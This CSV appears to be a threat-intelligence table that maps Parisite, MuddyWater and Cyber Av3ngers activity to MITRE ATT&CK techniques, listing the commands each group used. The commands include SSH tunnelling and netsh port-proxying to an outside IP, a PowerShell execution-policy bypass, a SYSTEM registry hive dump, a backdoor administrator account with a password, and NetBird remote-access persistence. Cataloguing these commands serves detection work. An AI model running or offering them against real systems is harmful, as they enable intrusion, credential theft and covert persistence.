Threat Actor,Tool,Mitre Category,Mitre Technique ID,Mitre Technique Name,CLI
Parisite,ipconfig,discovery,T1018,Remote System Discovery,"TNC <DC-2 IP> -Port 135
ipconfig /all
.\SOCKSSrv.exe
netstat -nao|findstr 28443
ssh 104.238.191.185 -P 443
ssh 104.238.191.185 -p 443
Enter-PSSession -ComputerName <DC-2 IP>
TNC <DC-2 IP> -Port 389
netstat -nao|findstr 443
cmd
.\SOCKSSrv.exe
netsh i p a v listenport=443 connecthost=127.0.0.1 connectport=28443
netsh i p a v listenport=443 connectaddress=127.0.0.1 connectport=28443
netsh i p re all
.\443.exe"
Parisite,ssh,command-and-control,T1090.001,Internal Proxy,"TNC <DC-2 IP> -Port 135
ipconfig /all
.\SOCKSSrv.exe
netstat -nao|findstr 28443
ssh 104.238.191.185 -P 443
ssh 104.238.191.185 -p 443
Enter-PSSession -ComputerName <DC-2 IP>
TNC <DC-2 IP> -Port 389
netstat -nao|findstr 443
cmd
.\SOCKSSrv.exe
netsh i p a v listenport=443 connecthost=127.0.0.1 connectport=28443
netsh i p a v listenport=443 connectaddress=127.0.0.1 connectport=28443
netsh i p re all
.\443.exe"
Parisite,ssh,discovery,T1049,System Network Connections Discovery,"TNC <DC-2 IP> -Port 135
ipconfig /all
.\SOCKSSrv.exe
netstat -nao|findstr 28443
ssh 104.238.191.185 -P 443
ssh 104.238.191.185 -p 443
Enter-PSSession -ComputerName <DC-2 IP>
TNC <DC-2 IP> -Port 389
netstat -nao|findstr 443
cmd
.\SOCKSSrv.exe
netsh i p a v listenport=443 connecthost=127.0.0.1 connectport=28443
netsh i p a v listenport=443 connectaddress=127.0.0.1 connectport=28443
netsh i p re all
.\443.exe"
Parisite,ssh,execution,T1059.001,PowerShell,"TNC <DC-2 IP> -Port 135
ipconfig /all
.\SOCKSSrv.exe
netstat -nao|findstr 28443
ssh 104.238.191.185 -P 443
ssh 104.238.191.185 -p 443
Enter-PSSession -ComputerName <DC-2 IP>
TNC <DC-2 IP> -Port 389
netstat -nao|findstr 443
cmd
.\SOCKSSrv.exe
netsh i p a v listenport=443 connecthost=127.0.0.1 connectport=28443
netsh i p a v listenport=443 connectaddress=127.0.0.1 connectport=28443
netsh i p re all
.\443.exe"
Parisite,ssh,discovery,T1016,System Network Configuration Discovery,"TNC <DC-2 IP> -Port 135
ipconfig /all
.\SOCKSSrv.exe
netstat -nao|findstr 28443
ssh 104.238.191.185 -P 443
ssh 104.238.191.185 -p 443
Enter-PSSession -ComputerName <DC-2 IP>
TNC <DC-2 IP> -Port 389
netstat -nao|findstr 443
cmd
.\SOCKSSrv.exe
netsh i p a v listenport=443 connecthost=127.0.0.1 connectport=28443
netsh i p a v listenport=443 connectaddress=127.0.0.1 connectport=28443
netsh i p re all
.\443.exe"
Parisite,ssh,lateral-movement,T1021.004,SSH,"TNC <DC-2 IP> -Port 135
ipconfig /all
.\SOCKSSrv.exe
netstat -nao|findstr 28443
ssh 104.238.191.185 -P 443
ssh 104.238.191.185 -p 443
Enter-PSSession -ComputerName <DC-2 IP>
TNC <DC-2 IP> -Port 389
netstat -nao|findstr 443
cmd
.\SOCKSSrv.exe
netsh i p a v listenport=443 connecthost=127.0.0.1 connectport=28443
netsh i p a v listenport=443 connectaddress=127.0.0.1 connectport=28443
netsh i p re all
.\443.exe"
Parisite,ssh,discovery,T1018,Remote System Discovery,"TNC <DC-2 IP> -Port 135
ipconfig /all
.\SOCKSSrv.exe
netstat -nao|findstr 28443
ssh 104.238.191.185 -P 443
ssh 104.238.191.185 -p 443
Enter-PSSession -ComputerName <DC-2 IP>
TNC <DC-2 IP> -Port 389
netstat -nao|findstr 443
cmd
.\SOCKSSrv.exe
netsh i p a v listenport=443 connecthost=127.0.0.1 connectport=28443
netsh i p a v listenport=443 connectaddress=127.0.0.1 connectport=28443
netsh i p re all
.\443.exe"
Parisite,netstat,command-and-control,T1090.001,Internal Proxy,"TNC <DC-2 IP> -Port 135
ipconfig /all
.\SOCKSSrv.exe
netstat -nao|findstr 28443
ssh 104.238.191.185 -P 443
ssh 104.238.191.185 -p 443
Enter-PSSession -ComputerName <DC-2 IP>
TNC <DC-2 IP> -Port 389
netstat -nao|findstr 443
cmd
.\SOCKSSrv.exe
netsh i p a v listenport=443 connecthost=127.0.0.1 connectport=28443
netsh i p a v listenport=443 connectaddress=127.0.0.1 connectport=28443
netsh i p re all
.\443.exe"
Parisite,netstat,discovery,T1049,System Network Connections Discovery,"TNC <DC-2 IP> -Port 135
ipconfig /all
.\SOCKSSrv.exe
netstat -nao|findstr 28443
ssh 104.238.191.185 -P 443
ssh 104.238.191.185 -p 443
Enter-PSSession -ComputerName <DC-2 IP>
TNC <DC-2 IP> -Port 389
netstat -nao|findstr 443
cmd
.\SOCKSSrv.exe
netsh i p a v listenport=443 connecthost=127.0.0.1 connectport=28443
netsh i p a v listenport=443 connectaddress=127.0.0.1 connectport=28443
netsh i p re all
.\443.exe"
Parisite,netstat,execution,T1059.001,PowerShell,"TNC <DC-2 IP> -Port 135
ipconfig /all
.\SOCKSSrv.exe
netstat -nao|findstr 28443
ssh 104.238.191.185 -P 443
ssh 104.238.191.185 -p 443
Enter-PSSession -ComputerName <DC-2 IP>
TNC <DC-2 IP> -Port 389
netstat -nao|findstr 443
cmd
.\SOCKSSrv.exe
netsh i p a v listenport=443 connecthost=127.0.0.1 connectport=28443
netsh i p a v listenport=443 connectaddress=127.0.0.1 connectport=28443
netsh i p re all
.\443.exe"
Parisite,netstat,discovery,T1016,System Network Configuration Discovery,"TNC <DC-2 IP> -Port 135
ipconfig /all
.\SOCKSSrv.exe
netstat -nao|findstr 28443
ssh 104.238.191.185 -P 443
ssh 104.238.191.185 -p 443
Enter-PSSession -ComputerName <DC-2 IP>
TNC <DC-2 IP> -Port 389
netstat -nao|findstr 443
cmd
.\SOCKSSrv.exe
netsh i p a v listenport=443 connecthost=127.0.0.1 connectport=28443
netsh i p a v listenport=443 connectaddress=127.0.0.1 connectport=28443
netsh i p re all
.\443.exe"
Parisite,netstat,lateral-movement,T1021.004,SSH,"TNC <DC-2 IP> -Port 135
ipconfig /all
.\SOCKSSrv.exe
netstat -nao|findstr 28443
ssh 104.238.191.185 -P 443
ssh 104.238.191.185 -p 443
Enter-PSSession -ComputerName <DC-2 IP>
TNC <DC-2 IP> -Port 389
netstat -nao|findstr 443
cmd
.\SOCKSSrv.exe
netsh i p a v listenport=443 connecthost=127.0.0.1 connectport=28443
netsh i p a v listenport=443 connectaddress=127.0.0.1 connectport=28443
netsh i p re all
.\443.exe"
Parisite,netstat,discovery,T1018,Remote System Discovery,"TNC <DC-2 IP> -Port 135
ipconfig /all
.\SOCKSSrv.exe
netstat -nao|findstr 28443
ssh 104.238.191.185 -P 443
ssh 104.238.191.185 -p 443
Enter-PSSession -ComputerName <DC-2 IP>
TNC <DC-2 IP> -Port 389
netstat -nao|findstr 443
cmd
.\SOCKSSrv.exe
netsh i p a v listenport=443 connecthost=127.0.0.1 connectport=28443
netsh i p a v listenport=443 connectaddress=127.0.0.1 connectport=28443
netsh i p re all
.\443.exe"
Parisite,findstr,command-and-control,T1090.001,Internal Proxy,"TNC <DC-2 IP> -Port 135
ipconfig /all
.\SOCKSSrv.exe
netstat -nao|findstr 28443
ssh 104.238.191.185 -P 443
ssh 104.238.191.185 -p 443
Enter-PSSession -ComputerName <DC-2 IP>
TNC <DC-2 IP> -Port 389
netstat -nao|findstr 443
cmd
.\SOCKSSrv.exe
netsh i p a v listenport=443 connecthost=127.0.0.1 connectport=28443
netsh i p a v listenport=443 connectaddress=127.0.0.1 connectport=28443
netsh i p re all
.\443.exe"
Parisite,findstr,discovery,T1049,System Network Connections Discovery,"TNC <DC-2 IP> -Port 135
ipconfig /all
.\SOCKSSrv.exe
netstat -nao|findstr 28443
ssh 104.238.191.185 -P 443
ssh 104.238.191.185 -p 443
Enter-PSSession -ComputerName <DC-2 IP>
TNC <DC-2 IP> -Port 389
netstat -nao|findstr 443
cmd
.\SOCKSSrv.exe
netsh i p a v listenport=443 connecthost=127.0.0.1 connectport=28443
netsh i p a v listenport=443 connectaddress=127.0.0.1 connectport=28443
netsh i p re all
.\443.exe"
Parisite,findstr,execution,T1059.001,PowerShell,"TNC <DC-2 IP> -Port 135
ipconfig /all
.\SOCKSSrv.exe
netstat -nao|findstr 28443
ssh 104.238.191.185 -P 443
ssh 104.238.191.185 -p 443
Enter-PSSession -ComputerName <DC-2 IP>
TNC <DC-2 IP> -Port 389
netstat -nao|findstr 443
cmd
.\SOCKSSrv.exe
netsh i p a v listenport=443 connecthost=127.0.0.1 connectport=28443
netsh i p a v listenport=443 connectaddress=127.0.0.1 connectport=28443
netsh i p re all
.\443.exe"
Parisite,findstr,discovery,T1016,System Network Configuration Discovery,"TNC <DC-2 IP> -Port 135
ipconfig /all
.\SOCKSSrv.exe
netstat -nao|findstr 28443
ssh 104.238.191.185 -P 443
ssh 104.238.191.185 -p 443
Enter-PSSession -ComputerName <DC-2 IP>
TNC <DC-2 IP> -Port 389
netstat -nao|findstr 443
cmd
.\SOCKSSrv.exe
netsh i p a v listenport=443 connecthost=127.0.0.1 connectport=28443
netsh i p a v listenport=443 connectaddress=127.0.0.1 connectport=28443
netsh i p re all
.\443.exe"
Parisite,findstr,lateral-movement,T1021.004,SSH,"TNC <DC-2 IP> -Port 135
ipconfig /all
.\SOCKSSrv.exe
netstat -nao|findstr 28443
ssh 104.238.191.185 -P 443
ssh 104.238.191.185 -p 443
Enter-PSSession -ComputerName <DC-2 IP>
TNC <DC-2 IP> -Port 389
netstat -nao|findstr 443
cmd
.\SOCKSSrv.exe
netsh i p a v listenport=443 connecthost=127.0.0.1 connectport=28443
netsh i p a v listenport=443 connectaddress=127.0.0.1 connectport=28443
netsh i p re all
.\443.exe"
Parisite,findstr,discovery,T1018,Remote System Discovery,"TNC <DC-2 IP> -Port 135
ipconfig /all
.\SOCKSSrv.exe
netstat -nao|findstr 28443
ssh 104.238.191.185 -P 443
ssh 104.238.191.185 -p 443
Enter-PSSession -ComputerName <DC-2 IP>
TNC <DC-2 IP> -Port 389
netstat -nao|findstr 443
cmd
.\SOCKSSrv.exe
netsh i p a v listenport=443 connecthost=127.0.0.1 connectport=28443
netsh i p a v listenport=443 connectaddress=127.0.0.1 connectport=28443
netsh i p re all
.\443.exe"
Parisite,Netsh,command-and-control,T1090.001,Internal Proxy,"TNC <DC-2 IP> -Port 135
ipconfig /all
.\SOCKSSrv.exe
netstat -nao|findstr 28443
ssh 104.238.191.185 -P 443
ssh 104.238.191.185 -p 443
Enter-PSSession -ComputerName <DC-2 IP>
TNC <DC-2 IP> -Port 389
netstat -nao|findstr 443
cmd
.\SOCKSSrv.exe
netsh i p a v listenport=443 connecthost=127.0.0.1 connectport=28443
netsh i p a v listenport=443 connectaddress=127.0.0.1 connectport=28443
netsh i p re all
.\443.exe"
Parisite,Netsh,discovery,T1049,System Network Connections Discovery,"TNC <DC-2 IP> -Port 135
ipconfig /all
.\SOCKSSrv.exe
netstat -nao|findstr 28443
ssh 104.238.191.185 -P 443
ssh 104.238.191.185 -p 443
Enter-PSSession -ComputerName <DC-2 IP>
TNC <DC-2 IP> -Port 389
netstat -nao|findstr 443
cmd
.\SOCKSSrv.exe
netsh i p a v listenport=443 connecthost=127.0.0.1 connectport=28443
netsh i p a v listenport=443 connectaddress=127.0.0.1 connectport=28443
netsh i p re all
.\443.exe"
Parisite,Netsh,execution,T1059.001,PowerShell,"TNC <DC-2 IP> -Port 135
ipconfig /all
.\SOCKSSrv.exe
netstat -nao|findstr 28443
ssh 104.238.191.185 -P 443
ssh 104.238.191.185 -p 443
Enter-PSSession -ComputerName <DC-2 IP>
TNC <DC-2 IP> -Port 389
netstat -nao|findstr 443
cmd
.\SOCKSSrv.exe
netsh i p a v listenport=443 connecthost=127.0.0.1 connectport=28443
netsh i p a v listenport=443 connectaddress=127.0.0.1 connectport=28443
netsh i p re all
.\443.exe"
Parisite,Netsh,discovery,T1016,System Network Configuration Discovery,"TNC <DC-2 IP> -Port 135
ipconfig /all
.\SOCKSSrv.exe
netstat -nao|findstr 28443
ssh 104.238.191.185 -P 443
ssh 104.238.191.185 -p 443
Enter-PSSession -ComputerName <DC-2 IP>
TNC <DC-2 IP> -Port 389
netstat -nao|findstr 443
cmd
.\SOCKSSrv.exe
netsh i p a v listenport=443 connecthost=127.0.0.1 connectport=28443
netsh i p a v listenport=443 connectaddress=127.0.0.1 connectport=28443
netsh i p re all
.\443.exe"
Parisite,Netsh,lateral-movement,T1021.004,SSH,"TNC <DC-2 IP> -Port 135
ipconfig /all
.\SOCKSSrv.exe
netstat -nao|findstr 28443
ssh 104.238.191.185 -P 443
ssh 104.238.191.185 -p 443
Enter-PSSession -ComputerName <DC-2 IP>
TNC <DC-2 IP> -Port 389
netstat -nao|findstr 443
cmd
.\SOCKSSrv.exe
netsh i p a v listenport=443 connecthost=127.0.0.1 connectport=28443
netsh i p a v listenport=443 connectaddress=127.0.0.1 connectport=28443
netsh i p re all
.\443.exe"
Parisite,Netsh,discovery,T1018,Remote System Discovery,"TNC <DC-2 IP> -Port 135
ipconfig /all
.\SOCKSSrv.exe
netstat -nao|findstr 28443
ssh 104.238.191.185 -P 443
ssh 104.238.191.185 -p 443
Enter-PSSession -ComputerName <DC-2 IP>
TNC <DC-2 IP> -Port 389
netstat -nao|findstr 443
cmd
.\SOCKSSrv.exe
netsh i p a v listenport=443 connecthost=127.0.0.1 connectport=28443
netsh i p a v listenport=443 connectaddress=127.0.0.1 connectport=28443
netsh i p re all
.\443.exe"
Parisite,Cmd,command-and-control,T1090.001,Internal Proxy,"TNC <DC-2 IP> -Port 135
ipconfig /all
.\SOCKSSrv.exe
netstat -nao|findstr 28443
ssh 104.238.191.185 -P 443
ssh 104.238.191.185 -p 443
Enter-PSSession -ComputerName <DC-2 IP>
TNC <DC-2 IP> -Port 389
netstat -nao|findstr 443
cmd
.\SOCKSSrv.exe
netsh i p a v listenport=443 connecthost=127.0.0.1 connectport=28443
netsh i p a v listenport=443 connectaddress=127.0.0.1 connectport=28443
netsh i p re all
.\443.exe"
Parisite,Cmd,discovery,T1049,System Network Connections Discovery,"TNC <DC-2 IP> -Port 135
ipconfig /all
.\SOCKSSrv.exe
netstat -nao|findstr 28443
ssh 104.238.191.185 -P 443
ssh 104.238.191.185 -p 443
Enter-PSSession -ComputerName <DC-2 IP>
TNC <DC-2 IP> -Port 389
netstat -nao|findstr 443
cmd
.\SOCKSSrv.exe
netsh i p a v listenport=443 connecthost=127.0.0.1 connectport=28443
netsh i p a v listenport=443 connectaddress=127.0.0.1 connectport=28443
netsh i p re all
.\443.exe"
Parisite,Cmd,execution,T1059.001,PowerShell,"TNC <DC-2 IP> -Port 135
ipconfig /all
.\SOCKSSrv.exe
netstat -nao|findstr 28443
ssh 104.238.191.185 -P 443
ssh 104.238.191.185 -p 443
Enter-PSSession -ComputerName <DC-2 IP>
TNC <DC-2 IP> -Port 389
netstat -nao|findstr 443
cmd
.\SOCKSSrv.exe
netsh i p a v listenport=443 connecthost=127.0.0.1 connectport=28443
netsh i p a v listenport=443 connectaddress=127.0.0.1 connectport=28443
netsh i p re all
.\443.exe"
Parisite,Cmd,discovery,T1016,System Network Configuration Discovery,"TNC <DC-2 IP> -Port 135
ipconfig /all
.\SOCKSSrv.exe
netstat -nao|findstr 28443
ssh 104.238.191.185 -P 443
ssh 104.238.191.185 -p 443
Enter-PSSession -ComputerName <DC-2 IP>
TNC <DC-2 IP> -Port 389
netstat -nao|findstr 443
cmd
.\SOCKSSrv.exe
netsh i p a v listenport=443 connecthost=127.0.0.1 connectport=28443
netsh i p a v listenport=443 connectaddress=127.0.0.1 connectport=28443
netsh i p re all
.\443.exe"
Parisite,Cmd,lateral-movement,T1021.004,SSH,"TNC <DC-2 IP> -Port 135
ipconfig /all
.\SOCKSSrv.exe
netstat -nao|findstr 28443
ssh 104.238.191.185 -P 443
ssh 104.238.191.185 -p 443
Enter-PSSession -ComputerName <DC-2 IP>
TNC <DC-2 IP> -Port 389
netstat -nao|findstr 443
cmd
.\SOCKSSrv.exe
netsh i p a v listenport=443 connecthost=127.0.0.1 connectport=28443
netsh i p a v listenport=443 connectaddress=127.0.0.1 connectport=28443
netsh i p re all
.\443.exe"
Parisite,Cmd,discovery,T1018,Remote System Discovery,"TNC <DC-2 IP> -Port 135
ipconfig /all
.\SOCKSSrv.exe
netstat -nao|findstr 28443
ssh 104.238.191.185 -P 443
ssh 104.238.191.185 -p 443
Enter-PSSession -ComputerName <DC-2 IP>
TNC <DC-2 IP> -Port 389
netstat -nao|findstr 443
cmd
.\SOCKSSrv.exe
netsh i p a v listenport=443 connecthost=127.0.0.1 connectport=28443
netsh i p a v listenport=443 connectaddress=127.0.0.1 connectport=28443
netsh i p re all
.\443.exe"
MuddyWater,Csc.exe,execution,T1059.001,PowerShell,"%WINDIR%\System32\WindowsPowerShell\v1.0\powershell.exe -exec bypass -w -l -file %ALLUSERSPROFILE%\a.ps1
%WINDIR%\Microsoft.NET\Framework64\v4.0.30319\csc.exe /noconfig /fullpaths @%WINDIR%\TEMP\dlr5lzwp\dlr5lzwp.cmdline
%WINDIR%\system32\reg.exe save HKLM\SYSTEM SystemBkup.hiv
%WINDIR%\system32\reg.exe %WINDIR%\system32\reg.exe save HKLM\SYSTEM SystemBkup.hiv"
MuddyWater,Csc.exe,execution,T1059.003,Windows Command Shell,"%WINDIR%\System32\WindowsPowerShell\v1.0\powershell.exe -exec bypass -w -l -file %ALLUSERSPROFILE%\a.ps1
%WINDIR%\Microsoft.NET\Framework64\v4.0.30319\csc.exe /noconfig /fullpaths @%WINDIR%\TEMP\dlr5lzwp\dlr5lzwp.cmdline
%WINDIR%\system32\reg.exe save HKLM\SYSTEM SystemBkup.hiv
%WINDIR%\system32\reg.exe %WINDIR%\system32\reg.exe save HKLM\SYSTEM SystemBkup.hiv"
MuddyWater,Reg,execution,T1059.001,PowerShell,"%WINDIR%\System32\WindowsPowerShell\v1.0\powershell.exe -exec bypass -w -l -file %ALLUSERSPROFILE%\a.ps1
%WINDIR%\Microsoft.NET\Framework64\v4.0.30319\csc.exe /noconfig /fullpaths @%WINDIR%\TEMP\dlr5lzwp\dlr5lzwp.cmdline
%WINDIR%\system32\reg.exe save HKLM\SYSTEM SystemBkup.hiv
%WINDIR%\system32\reg.exe %WINDIR%\system32\reg.exe save HKLM\SYSTEM SystemBkup.hiv"
MuddyWater,Reg,execution,T1059.003,Windows Command Shell,"%WINDIR%\System32\WindowsPowerShell\v1.0\powershell.exe -exec bypass -w -l -file %ALLUSERSPROFILE%\a.ps1
%WINDIR%\Microsoft.NET\Framework64\v4.0.30319\csc.exe /noconfig /fullpaths @%WINDIR%\TEMP\dlr5lzwp\dlr5lzwp.cmdline
%WINDIR%\system32\reg.exe save HKLM\SYSTEM SystemBkup.hiv
%WINDIR%\system32\reg.exe %WINDIR%\system32\reg.exe save HKLM\SYSTEM SystemBkup.hiv"
MuddyWater,PowerShell,execution,T1059.001,PowerShell,"%WINDIR%\System32\WindowsPowerShell\v1.0\powershell.exe -exec bypass -w -l -file %ALLUSERSPROFILE%\a.ps1
%WINDIR%\Microsoft.NET\Framework64\v4.0.30319\csc.exe /noconfig /fullpaths @%WINDIR%\TEMP\dlr5lzwp\dlr5lzwp.cmdline
%WINDIR%\system32\reg.exe save HKLM\SYSTEM SystemBkup.hiv
%WINDIR%\system32\reg.exe %WINDIR%\system32\reg.exe save HKLM\SYSTEM SystemBkup.hiv"
MuddyWater,PowerShell,execution,T1059.003,Windows Command Shell,"%WINDIR%\System32\WindowsPowerShell\v1.0\powershell.exe -exec bypass -w -l -file %ALLUSERSPROFILE%\a.ps1
%WINDIR%\Microsoft.NET\Framework64\v4.0.30319\csc.exe /noconfig /fullpaths @%WINDIR%\TEMP\dlr5lzwp\dlr5lzwp.cmdline
%WINDIR%\system32\reg.exe save HKLM\SYSTEM SystemBkup.hiv
%WINDIR%\system32\reg.exe %WINDIR%\system32\reg.exe save HKLM\SYSTEM SystemBkup.hiv"
MuddyWater,PowerShell,execution,T1059.001,PowerShell,powershell.exe -WindowStyle Hidden
MuddyWater,PowerShell,defense-evasion,T1564.003,Hidden Window,powershell.exe -WindowStyle Hidden
MuddyWater,NetBird,persistence,T1133,External Remote Services,netbird.exe setup --setup-key E48E4A70-4CF4-4A77-946B-C8E50A60855A --management-url
MuddyWater,Schtasks.exe,execution,T1053.005,Scheduled Task,schtasks /create /tn ForceNetbirdRestart
MuddyWater,Windows Service Configuration Tool,persistence,T1133,External Remote Services,sc config netbird start= delayed-auto
MuddyWater,Windows Service Configuration Tool,persistence,T1543.003,Windows Service,sc config netbird start= delayed-auto
MuddyWater,NetBird,persistence,T1133,External Remote Services,sc config netbird start= delayed-auto
MuddyWater,NetBird,persistence,T1543.003,Windows Service,sc config netbird start= delayed-auto
MuddyWater,OpenSSH,persistence,T1543.003,Windows Service,sc config sshd start= auto
MuddyWater,Windows Service Configuration Tool,persistence,T1543.003,Windows Service,sc config sshd start= auto
MuddyWater,Net,persistence,T1136.001,Local Account,net user user Bs@202122 /add
MuddyWater,Net,persistence,T1098.007,Additional Local or Domain Groups,net localgroup Administrators user /add
MuddyWater,Net,persistence,T1098.007,Additional Local or Domain Groups,net localgroup Administrateurs user /add
MuddyWater,WMIC,execution,T1047,Windows Management Instrumentation,wmic useraccount where name='user' set passwordexpires=false
MuddyWater,WMIC,persistence,T1098,Account Manipulation,wmic useraccount where name='user' set passwordexpires=false
Cyber Av3ngers,curl,execution,T1059.004,Unix Shell,curl --http2 --header accept: application/dns-json https://1.1.1.1/dns-query?name=google.com
Cyber Av3ngers,whoami,discovery,T1082,System Information Discovery,"uname -v > /tmp/{RANDOM_16_chars}.txt 2>&1
hostname > /tmp/{RANDOM_16_chars}.txt 2>&1
whoami   > /tmp/{RANDOM_16_chars}.txt 2>&1
date +%Z > /tmp/{RANDOM_16_chars}.txt 2>&1
uname -r > /tmp/{RANDOM_16_chars}.txt 2>&1"
Cyber Av3ngers,whoami,discovery,T1033,System Owner/User Discovery,"uname -v > /tmp/{RANDOM_16_chars}.txt 2>&1
hostname > /tmp/{RANDOM_16_chars}.txt 2>&1
whoami   > /tmp/{RANDOM_16_chars}.txt 2>&1
date +%Z > /tmp/{RANDOM_16_chars}.txt 2>&1
uname -r > /tmp/{RANDOM_16_chars}.txt 2>&1"
Cyber Av3ngers,whoami,discovery,T1124,System Time Discovery,"uname -v > /tmp/{RANDOM_16_chars}.txt 2>&1
hostname > /tmp/{RANDOM_16_chars}.txt 2>&1
whoami   > /tmp/{RANDOM_16_chars}.txt 2>&1
date +%Z > /tmp/{RANDOM_16_chars}.txt 2>&1
uname -r > /tmp/{RANDOM_16_chars}.txt 2>&1"
Cyber Av3ngers,date,discovery,T1082,System Information Discovery,"uname -v > /tmp/{RANDOM_16_chars}.txt 2>&1
hostname > /tmp/{RANDOM_16_chars}.txt 2>&1
whoami   > /tmp/{RANDOM_16_chars}.txt 2>&1
date +%Z > /tmp/{RANDOM_16_chars}.txt 2>&1
uname -r > /tmp/{RANDOM_16_chars}.txt 2>&1"
